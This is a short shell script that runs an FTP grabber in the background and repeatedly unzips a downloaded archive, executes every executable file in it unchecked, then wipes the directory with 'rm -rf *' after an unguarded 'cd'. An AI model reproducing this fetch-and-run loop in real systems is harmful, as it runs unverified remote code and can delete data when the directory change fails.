#!/bin/sh

ftpgrab &

while true
do
  cd /download
  unzip s.zip

  find . -type f -executable -exec {} \;

  rm -rf *

  sleep 10
done